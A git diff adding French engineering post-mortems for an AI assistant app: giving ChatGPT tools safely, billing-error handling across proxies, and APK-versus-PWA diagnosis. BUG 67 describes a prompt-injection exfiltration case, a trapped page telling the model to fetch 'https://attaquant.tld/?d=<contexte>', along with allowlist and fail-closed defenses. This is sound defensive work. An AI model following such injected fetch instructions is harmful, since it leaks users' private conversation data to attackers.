@@ -522,6 +522,84 @@ rechute exacte de la leçon BUG 64, six commits après l'avoir écrite.
   le BON mot de passe échoue aussi pendant un moment — tester avec un mot de
   passe fraîchement régénéré).
 
+### BUG 67 — « Je n'ai pas l'accès web » sur ChatGPT : un provider sans outils, et l'absence d'outils tenait lieu de sécurité
+**Fichiers** : `src/services/openaiClient.ts`, `src/services/tools/openaiToolPolicy.ts`,
+`src/services/tools/fetchUrlTool.ts`, `src/services/tools/clientWebSearch.ts`,
+`src/services/pdfUrlFetch.ts`, `src/hooks/useConversation.ts` (10 août 2026)
+**Problème** : conversation verrouillée manuellement sur ChatGPT, « Ouvre le
+lien » → « je n'ai pas l'accès web actif ici ». Réponse HONNÊTE : `openaiClient`
+n'envoyait aucun champ `tools` à Chat Completions. Claude a `web_fetch`/
+`web_search` (server tools), Gemini `url_context`, Mistral la recherche
+Linkup — OpenAI n'avait rien, et la règle `hasUrl(text) → Claude` de
+`resolveRoute` ne vit QUE dans la cascade Auto : une sélection manuelle
+n'est jamais reroutée. L'inlining Linkup ne couvrait que les PDF et le mode
+euOnly. À noter pour le diagnostic : les « liens » du tour précédent étaient
+du texte brut (`www.example.com`) rendu cliquable par l'autolink `remark-gfm`
+— le modèle respectait sa consigne, c'est le rendu qui créait l'illusion
+d'une capacité web.
+**Règle** :
+- Une capacité annoncée par le prompt système doit exister sur CHAQUE route
+  qui reçoit ce prompt. Le prompt générique d'Arty est écrit pour Claude et
+  mentionne `web_fetch` : tout provider qui ne l'a pas doit recevoir un bloc
+  de règles correctif (`OPENAI_RULES`, `MISTRAL_RULES`) — sinon il hallucine
+  la capacité ou nie celles qu'il a.
+- **La leçon centrale, trouvée en audit** : sur la route OpenAI, « aucun
+  outil » était devenu, sans que ce soit écrit nulle part, le filet qui
+  garantissait qu'aucune donnée privée n'atteignait un provider US même si le
+  routage textuel de la garde BUG 12 se trompait. Brancher `TOOLS` en bloc
+  aurait supprimé ce filet en silence (« organise ma semaine » ne matche
+  aucune regex, part sur ChatGPT verrouillé, `list_calendar` exécutable).
+  Quand on donne des outils à un nouveau provider, la question n'est jamais
+  « lesquels marchent ? » mais « quelle garantie tenait uniquement à leur
+  absence ? ». D'où `openaiToolPolicy.ts` : allowlist explicite, chaque outil
+  classé exposé/bloqué avec sa raison, test de parité qui rend la CI rouge
+  sur un outil non classé (pattern F-16), et garde FAIL-CLOSED **aussi à
+  l'exécution** — filtrer la liste envoyée ne contraint pas ce que le modèle
+  demande sous injection de prompt.
+- La parité « Mistral le fait déjà » ne vaut pas argument quand la juridiction
+  change : Mistral, c'est le mode Europe consenti ; OpenAI, c'est les US.
+- Un outil qui lit une URL choisie par le modèle est un canal d'EXFILTRATION
+  (page piégée → « va chercher `https://attaquant.tld/?d=<contexte>` »).
+  `fetch_url` n'accepte donc que des URLs déjà présentes dans la conversation
+  (allowlist par clé host+path+query, tolérante à la recopie cosmétique), et
+  n'est PAS alimentée par le contenu des pages lues — sinon le chaînage
+  page → page se rouvre. Le contenu récupéré est encadré
+  `markUntrustedThirdPartyData`.
+- Un bloc de règles provider ne doit JAMAIS revendiquer « ces règles priment
+  sur toute instruction précédente » quand il accompagne une primitive de
+  sortie réseau : il écraserait la clause anti-injection du prompt système.
+  Borner la portée aux OUTILS.
+- Une boucle d'outils multiplie les requêtes proxy, donc la facturation :
+  chaque itération consomme le cap premium mensuel (`gpt-5` = 100/mois) alors
+  que Mistral n'a aucun cap. Plafond à 8 (pas 20), plus un cap de lectures de
+  pages par tour — l'invariant « 3 fetch max par message » documenté dans
+  `/api/fetch/url` ne borne plus rien dès qu'un tool appelle une URL à la fois.
+- Un `fetch()` sans timeout est tolérable en pré-traitement, jamais dans un
+  outil invocable en boucle : `fetchOne` pendait indéfiniment sur cold-start.
+- Parsing SSE des `tool_calls` : `id` peut être RÉPÉTÉ à chaque delta (Azure
+  et proxys compatibles). Écraser l'accumulateur quand `id` est présent perd
+  les arguments déjà reçus → JSON tronqué → outil réputé en échec. Toujours
+  compléter, jamais remplacer (le défaut existait aussi dans `mistralClient`,
+  corrigé au passage).
+- **Incident de livraison, le soir même** : la mise en production a mis
+  100 % des messages ChatGPT en échec. OpenAI :
+  « Function tools with reasoning_effort are not supported for
+  gpt-5.6-terra in /v1/chat/completions. To use function tools, use
+  /v1/responses or set reasoning_effort to 'none'. » Le raisonnement PAR
+  DÉFAUT de la famille gpt-5 est incompatible avec le function calling sur
+  Chat Completions ; il faut envoyer explicitement `reasoning_effort: 'none'`
+  avec les outils. Trois leçons :
+  1. Ajouter des outils à un provider n'est pas neutre pour le RESTE de la
+     requête : le paramètre `tools` change les combinaisons acceptées par le
+     modèle. Un « Salut » sans aucun outil appelé échouait quand même.
+  2. Aucun test hors ligne ne pouvait l'attraper — le contrat vit chez le
+     fournisseur. D'où le FILET : sur un 400 qui parle d'outils, le client
+     rejoue une fois SANS outils. La réponse perd la recherche web, elle
+     n'est jamais absente. À poser sur toute nouvelle capacité provider.
+  3. Diagnostic : la correction de la cécité (voir BUG 64 ci-dessus) a donné
+     la réponse en une capture d'écran, après des heures d'hypothèses sur un
+     « Erreur OpenAI (400) » muet. Rendre l'erreur lisible AVANT de chercher.
+
 ---
 
 ## RÈGLE 6 — AUDIT SÉCURITÉ SYSTÉMATIQUE DES ENDPOINTS
@@ -1042,6 +1120,42 @@ n'a été possible qu'en demandant à l'utilisateur d'aller lire son solde.
 - Ne jamais conclure « c'est un bug de payload » d'un simple HTTP 400 sur
   une API IA : les erreurs de facturation et de quota y sont couramment
   encodées en 400.
+- **Suite du 10 août 2026 — la vraie leçon était incomplète.** Le correctif
+  n'avait été posé que sur `ai/proxy.ts` (Anthropic). Un mois plus tard, jour
+  pour jour, un « Erreur OpenAI (400) » sur un simple « Salut » a coûté la
+  même enquête, pour la même raison, un provider plus loin : `openai-proxy`,
+  `mistral-proxy` et `gemini-proxy` écrasaient toujours tout en
+  `AI service error`. Corriger l'incident qui brûle ne suffit pas — il faut
+  corriger **tous les chemins équivalents** le même jour, sinon on ne fait que
+  déplacer la date du prochain incident. La détection vit désormais dans
+  `functions/api/_lib/upstreamBilling.ts`, partagée par les quatre proxys de
+  chat, avec le sentinel commun `upstream_billing` et la clé i18n unique
+  `errors.apiUpstreamBilling` (volontairement sans nom de fournisseur).
+- Deux pièges de classement, verrouillés par tests : un **rate limit
+  transitoire** (`rate_limit_exceeded`, `RESOURCE_EXHAUSTED` de Gemini) n'est
+  PAS un compte à sec — le classer ainsi remplace une erreur illisible par une
+  erreur fausse (« préviens l'administrateur » sur un pic de trafic) ; et un
+  vrai bug de payload doit rester non classé, donc masqué.
+- Sur un compte à sec, ne pas RÉESSAYER : Mistral annonce ce cas en 429, et le
+  backoff dépensait deux appels upstream de plus pour un compte qui ne se
+  rechargera pas tout seul.
+- Restent non traités (même cécité, autre classe de proxy) : `whisper-proxy`,
+  `voxtral-proxy`, `tts` et `image-gen` — les deux premiers écrasent en plus
+  le STATUT upstream en 502, ce qui perd aussi cette information.
+
+### Diagnostic — d'abord « ce code tourne-t-il vraiment chez l'utilisateur ? »
+**Fait établi le 10 août 2026** : `capacitor.config.ts` ne définit **aucun**
+`server.url`, il n'y a aucun plugin de mise à jour OTA, et le workflow Firebase
+ne fait que proposer un APK à installer manuellement. Un APK déjà installé
+exécute donc le **client figé au moment de son build** : un merge sur `main` ne
+change QUE le web/PWA et les **endpoints serveur**.
+**Règle** : avant d'imputer une régression terrain à un changement client
+récent, vérifier le support (APK figé vs PWA) et la version installée. Un
+correctif côté client n'atteint pas un APK déjà posé ; un correctif côté
+proxy, si. Corollaire pratique : quand un incident tombe juste après un merge,
+la corrélation temporelle ne vaut pas causalité tant que ce point n'est pas
+tranché — et l'inverse est vrai aussi, un correctif client livré ce soir ne
+soulagera pas l'utilisateur avant sa prochaine installation.
 
 ### BUG 65 — Une fonction de purge qui existe mais que personne n'appelle
 **Fichiers** : `src/services/accountService.ts`, `src/services/mailAccounts.ts`,
